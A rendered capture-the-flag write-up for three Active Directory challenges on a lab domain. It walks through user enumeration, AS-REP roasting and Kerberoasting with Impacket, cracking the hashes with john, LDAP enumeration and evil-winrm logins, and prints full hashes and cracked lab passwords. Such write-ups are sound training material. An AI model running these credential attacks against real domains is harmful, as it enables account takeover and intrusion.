@@ -1,0 +1,313 @@
+I"�f<h1 id="challenge-1-blemflarck">Challenge-1 Blemflarck</h1>
+<p>The Galactic Federation is taking control over the universe using a group of superheroes. The world’s redemption is in your hands.</p>
+
+<p>Enter the intergalactic portal and sabotage the admins to mark the end of Citadel.</p>
+
+<p>Here’s some info I’ve infiltrated for you, now lead us.</p>
+
+<p>Links: admins.txt, nmap scan, /etc/hosts file</p>
+<h2 id="solution">Solution</h2>
+<p>We’ve been given 3 files: nmap.txt, hosts file and admins.txt</p>
+<ol>
+  <li>nmap.txt gives us the domain name - <code class="language-plaintext highlighter-rouge">vindicators.local</code> via LDAP and RDP.</li>
+  <li>hosts file gives us the IP for the domain <code class="language-plaintext highlighter-rouge">vindicators.local</code></li>
+  <li>admins.txt contains potential usernames in the domain, we can see which of them are valid using <code class="language-plaintext highlighter-rouge">kerbrute</code>:</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>kerbrute <span class="nt">-domain</span> vindicators.space <span class="nt">-users</span> admins.txt <span class="nt">-dc-ip</span> vindicators.space
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Valid user <span class="o">=&gt;</span> administrator
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Blocked/Disabled user <span class="o">=&gt;</span> cardinal
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Valid user <span class="o">=&gt;</span> mirage
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Valid user <span class="o">=&gt;</span> shreya <span class="o">[</span>NOT PREAUTH]
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Blocked/Disabled user <span class="o">=&gt;</span> guest
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Blocked/Disabled user <span class="o">=&gt;</span> krbtgt
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No passwords were discovered :<span class="s1">'(
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>We’ve 3 potential users to attack which are: cardinal, mirage and shreya.</p>
+
+<p><code class="language-plaintext highlighter-rouge">shreya [NOT PREAUTH]</code> tells us that user <code class="language-plaintext highlighter-rouge">shreya</code> does not require pre-authentication and hence is vulnerable to AS-REP Roasting attack.</p>
+
+<p>To perform AS-REP Roasting on user Shreya:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>GetNPUsers.py <span class="nt">-dc-ip</span> vindicators.space vindicators.space/shreya <span class="nt">-format</span> john
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="k">for </span>it is now deprecated <span class="k">in </span>cryptography, and will be removed <span class="k">in </span>the next release.
+Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cannot authenticate shreya, getting its TGT
+<span class="nv">$krb5asrep$shreya</span>@VINDICATORS.SPACE:ecb8b3d21982a406ed37f77dcad5789f<span class="nv">$5dc5b5521584434cab9dccf2f55c5a765ff48180248405eb05491ef9bfba8fed8653e8f44d532c081693db93c237b79a2d714a1b6f4b19e2e9a427d812c20b8859e799ca1e01c6672b34c481dbba533100997045e98aa09970aa0d2b451a919903864f328feee970ab8c1a524e283ec540bd1a16612052faf07807682ffd7b92ee48a5fb9ca642efc6aaa6340a4d4c274c254f48d373d799d7d38006151232ff0249f1849406c3cd76cb89e30e136b0c9d2532079a3982b9bd457fe6710cac0a5bf04dd48b75f0314f188ea1258c38df95b7697eebb550a9b2086a5f152f0be361653b79bb486d53c3bee68e4306def0acdd170d1a11</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Cracking TGT with john:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="nv">$anturce77RioGr</span>@ndePR <span class="o">(</span><span class="nv">$krb5asrep$shreya</span>@VINDICATORS.SPACE<span class="o">)</span>
+1g 0:00:00:11 DONE <span class="o">(</span>2022-08-10 01:59<span class="o">)</span> 0.08460g/s 1212Kp/s 1212Kc/s 1212KC/s <span class="nv">$dollars$66</span>..<span class="nv">$P</span>@tTY8m0N
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Getting flag:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> vindicators.space <span class="nt">-u</span> shreya <span class="nt">-p</span> <span class="s1">'$anturce77RioGr@ndePR'</span>
+Evil-WinRM shell v3.4
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>hreya<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\u</span>sers<span class="se">\s</span>hreya<span class="se">\D</span>esktop<span class="se">\f</span>lag.txt
+flag<span class="o">{</span>0038ea8348bc778820d95448538b70a9_#A5-R3P-R405t??_4uth3nt1c4t10n_R405t3d!!<span class="o">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<h1 id="challenge-2-dab-389-b">Challenge-2 DAB-389 b</h1>
+<p>A mole among us informed the Federation about our plans and now you’re abandoned on a planet: DAB-389 b.</p>
+
+<p>Enumerate and find the traitor out for us. It’s hiding in the same planet.</p>
+<h2 id="solution-1">Solution</h2>
+<p>DAB and 389 hints towards LDAP and port 389. But nevertheless this challenge can be solved in many ways.</p>
+
+<h3 id="using-ldapsearch">Using Ldapsearch</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-H</span> ldap://54.149.74.158:389/ <span class="nt">-b</span> <span class="s2">"DC=vindicators,DC=space"</span> <span class="nt">-D</span> <span class="s1">'vindicators\shreya'</span> <span class="nt">-w</span> <span class="s1">'$anturce77RioGr@ndePR'</span> <span class="nt">-o</span> <span class="nv">ldif_wrap</span><span class="o">=</span>no | <span class="nb">grep</span> <span class="s1">' Flag'</span>
+description: Vindicators-DC. Good job checking out every workstation!! Flag2/3: 199698b475c48c_LD4P_
+description: Disabled Account cardinal<span class="p">;</span> it was Hacked. Flag1/3: flag<span class="o">{</span>3fe05494a09ac38bb5
+description: Good catch! Helpdesk isn<span class="s1">'t a default group. Flag3/3: 3num3r4t10n_FTW_:)}
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="using-ldapdomaindump">Using Ldapdomaindump</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ldapdomaindump vindicators.space <span class="nt">-u</span> vindicators<span class="se">\\</span>shreya <span class="nt">-p</span> <span class="s1">'$anturce77RioGr@ndePR'</span> <span class="nt">-o</span> ldapdomaindump/
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to host...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Binding to host
+<span class="o">[</span>+] Bind OK
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting domain dump
+<span class="o">[</span>+] Domain dump finished
+
+<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-irEoh</span> <span class="s1">' Flag.*'</span> ./ldapdomaindump/ | <span class="nb">sort</span> <span class="nt">-u</span>
+ Flag1/3: flag<span class="o">{</span>3fe05494a09ac38bb5
+ Flag1/3: flag<span class="o">{</span>3fe05494a09ac38bb5<span class="s2">"
+ Flag1/3: flag{3fe05494a09ac38bb5&lt;/td&gt;&lt;/tr&gt;
+ Flag2/3: 199698b475c48c_LD4P_
+ Flag2/3: 199698b475c48c_LD4P_"</span>
+ Flag2/3: 199698b475c48c_LD4P_&lt;/td&gt;&lt;/tr&gt;
+ Flag3/3: 3num3r4t10n_FTW_:<span class="o">)}</span><span class="s2">"
+ Flag3/3: 3num3r4t10n_FTW_:)}   08/09/22 18:44:56       08/09/22 18:44:56
+ Flag3/3: 3num3r4t10n_FTW_:)}&lt;/td&gt;&lt;td&gt;08/09/22 18:44:56
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>You can also view the output html files instead of grep and manually go through the information.</p>
+
+<h3 id="manually-enumerating-the-domain-using-ad-cmdlets">Manually enumerating the Domain using AD cmdlets</h3>
+
+<p>If you checkout description the disabled user cardinal(you can safely check description for all users too) and all the computers(there’s only one which is the DC itself):</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADUser</span><span class="w"> </span><span class="nx">cardinal</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">Description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Description</span><span class="w">
+</span><span class="n">Description</span><span class="w">
+</span><span class="o">-----------</span><span class="w">
+</span><span class="n">Disabled</span><span class="w"> </span><span class="nx">Account</span><span class="w"> </span><span class="nx">cardinal</span><span class="p">;</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">Hacked.</span><span class="w"> </span><span class="nx">Flag1/3:</span><span class="w"> </span><span class="nx">flag</span><span class="p">{</span><span class="mi">3</span><span class="n">fe05494a09ac38bb5</span><span class="w">
+
+</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">Description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Description</span><span class="w">
+</span><span class="n">Description</span><span class="w">
+</span><span class="o">-----------</span><span class="w">
+</span><span class="n">Vindicators-DC.</span><span class="w"> </span><span class="nx">Good</span><span class="w"> </span><span class="nx">job</span><span class="w"> </span><span class="nx">checking</span><span class="w"> </span><span class="nx">out</span><span class="w"> </span><span class="nx">every</span><span class="w"> </span><span class="nx">workstation</span><span class="o">!!</span><span class="w"> </span><span class="nx">Flag2/3:</span><span class="w"> </span><span class="nx">199698b475c48c_LD4P_</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>If you check all the groups present in this AD, Vindicators Helpdesk is not a default one and the odd one out.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span><span class="o">...</span><span class="w">
+</span><span class="n">Protected</span><span class="w"> </span><span class="nx">Users</span><span class="w">
+</span><span class="n">Key</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
+</span><span class="n">Enterprise</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
+</span><span class="n">DnsAdmins</span><span class="w">
+</span><span class="nx">DnsUpdateProxy</span><span class="w">
+</span><span class="n">Vindicators</span><span class="w"> </span><span class="nx">Helpdesk</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>If you check description for the group <code class="language-plaintext highlighter-rouge">Vindicators Helpdesk</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"Vindicators Helpdesk"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">Description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">Description</span><span class="w">
+</span><span class="n">Description</span><span class="w">
+</span><span class="o">-----------</span><span class="w">
+</span><span class="n">Good</span><span class="w"> </span><span class="nx">catch</span><span class="o">!</span><span class="w"> </span><span class="nx">Helpdesk</span><span class="w"> </span><span class="nx">isn</span><span class="s1">'t a default group. Flag3/3: 3num3r4t10n_FTW_:)}
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Can be solved in more ways :) Waiting for your writeups.</p>
+
+<hr />
+
+<h1 id="challenge-3-the-fall-phoenixperson">Challenge-3 The Fall: PhoenixPerson</h1>
+<p>While the war is still out there for the final redemption, you lost your dearest friend PhoenixPerson.</p>
+
+<p>Remembering, How he used to make delicious toasts for you.. tears, revenge and a heated battle stands infront of you.</p>
+<h2 id="solution-2">Solution</h2>
+<p>Since, we’ve only one user left to attack which is mirage, we can either check all the properties for that specific user and find out that this user has a Service Principle Name (SPN) like this:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"mirage"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>or We can just checkout all the users having servicePrincipalName attribute set and there’s only 2. One of them is krbtgt itself (obviously)</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">servicePrincipalName</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">""</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">servicePrincipalName</span><span class="w">
+
+</span><span class="n">Name</span><span class="w">   </span><span class="nx">servicePrincipalName</span><span class="w">
+</span><span class="o">----</span><span class="w">   </span><span class="o">--------------------</span><span class="w">
+</span><span class="n">krbtgt</span><span class="w"> </span><span class="p">{</span><span class="n">kadmin/changepw</span><span class="p">}</span><span class="w">
+</span><span class="n">mirage</span><span class="w"> </span><span class="p">{</span><span class="n">domain-controller/megaservice.vindicators.space</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>That means mirage is potentially vulnerable to Kerberoasting and we might even get this user’s credentials if they’re weak.</p>
+
+<p>To try kerberoasting:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>GetUserSPNs.py <span class="nt">-request</span> <span class="nt">-dc-ip</span> vindicators.space vindicators.space/shreya:<span class="s1">'$anturce77RioGr@ndePR'</span>
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="k">for </span>it is now deprecated <span class="k">in </span>cryptography, and will be removed <span class="k">in </span>the next release.
+Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName                             Name    MemberOf                                                       PasswordLastSet             LastLogon                   Delegation
+<span class="nt">-----------------------------------------------</span>  <span class="nt">------</span>  <span class="nt">-------------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+domain-controller/megaservice.vindicators.space  mirage  <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>vindicators,DC<span class="o">=</span>space  2022-08-10 00:14:56.997841  2022-08-10 00:14:57.810357
+
+
+
+<span class="nv">$krb5tgs$23$*</span>mirage<span class="nv">$VINDICATORS</span>.SPACE<span class="nv">$vindicators</span>.space/mirage<span class="k">*</span><span class="nv">$84e342306c92119899c19cc6dae7c923$efad1c48056b09e2fdb73ec74531e76fc3aa2fba473436fa589055a207119cd867edc98a153680fb2ab2331e40e589e07a853e75d98cc0cc689f7efc101ed774354c798e945911be832a10285ac0058586b81dc5d0ac218660271964f32eafc38c29fd7e3f62707c3c690dc99813bfaaf6995c2a3d99c11ca25586d41e5141f3eeb1e3698570629891b0061cc7e7e3e21954b7cd81b6bf7d739da025c2a908d52e8a90929f2ecaaf72e0b447dc6e789ea04268401fdb9d359797b2bd241e3b036dd09b94291386d35ed2e3266c100d0d10c222833a928528e144bb81dc4996f2fa0d582bb0510a73306cdbe2a2b289815dd44d02d8ef603d39530cdce4245020ac0b84ca15b86f37e91d04769587cb808a1bc311127dfe8897691bb7100b37fd4f1be524e806f5065e7b1088977eef4947c08ced596ca6cda923cff06894b5d738c6cac4f163789a04304e439ce23bc1c08dead4459d8bafa832dbb9592767c02879c2ba51dd82e970b4329a835806b9be0c579f188466bbff30481864a2a00fd9ae709c5bd37dff5f39d44b2ae2f0b28a5eb905951fb2ce7c1577ece0f71d3e8c593b61fe3103d2a299dedb8a959feba85d310951f0cf2881d6dd36726ea376a7b6505a479f57277c0f69250af72b49825614c47dd2755d0fc59ab74a872c6acd63ca1e1ef767dbdb28431a257d877bb96489b95937ac86c94e74608b4931338c6f7f5fecb6185f91534e47501df216b8ba43812e280a315a4cc92892486aa969c214a5e3c12175151d9682a738423faf1bf517f7d792ead08830b1e4a50f113753f21cc815331611baeadfc20efae189f3b2101178d670c0d9881afdec084f7ecd9c7773b4f4dcfe7ce372ee55581b4840a54082525c69e5c60969306860831e96fde4fa9e9749bcded60f2d6315b901832a08d1785cd375d2aca6ebf6b75096fc6b64e2421eb1bdac1bfb0629f9547613da00018934747b7475174d824a117d0decc58e042ba57dc7012bda36d1aaa9840f560d096ac58d3c29b3dd9a841af6f7ff7ff3da06ea9560be505b564e247effccfb78156744748853e559c2ef1567046472c2c74061ca2bfbe04c687248a30b699c07670f664a54ecfe4c25118731c3c5b4f38db1d6df058f371234e657c6f4883cbc595b43ff8bbdd3ee8d54cd14dc8262a9f09b1931d3b6b3eb46517487c6732c93c9c485b0c1da8d9a3ca7677caa9f2a1e9f0cd2f4ba4b60527066575ca5e77c21702c842d16518d3d4ebcf8cb92fc00ad1329a48c327416667431c94b65b1105ec1fbd597dcef49c75d73be3cc10ff18a9ec4082a0fa0266a5df82b2151404205a82ab115c4e89033b7ce77cc748820215bc05c1e9d870eae6c7138d50dbcf47cab8acf049071c9f741c419852c275beab11c28d684d3e5c1ed9a90dc9fb0011bf4012162247a8824f272ce</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Let’s crack this TGS:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="o">!</span>@#New_Life87!@# <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:16 DONE <span class="o">(</span>2022-08-10 03:22<span class="o">)</span> 0.05885g/s 844152p/s 844152c/s 844152C/s <span class="o">!</span>@#hct..!<span class="o">))</span>&amp;!<span class="o">(</span>&amp;^h
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Using these credentials with winrm:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> vindicators.space <span class="nt">-u</span> mirage <span class="nt">-p</span> <span class="s1">'!@#New_Life87!@#'</span>
+Evil-WinRM shell v3.4
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>irage<span class="se">\D</span>ocuments&gt; <span class="nb">cat </span>C:<span class="se">\U</span>sers<span class="se">\M</span>irage<span class="se">\D</span>esktop<span class="se">\f</span>lag.txt
+flag<span class="o">{</span>aef955e10aad6bc0890277e215288c84_<span class="o">(</span>M1r4g3_T04st3d?_K3rb3r40st3d!<span class="o">)!}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
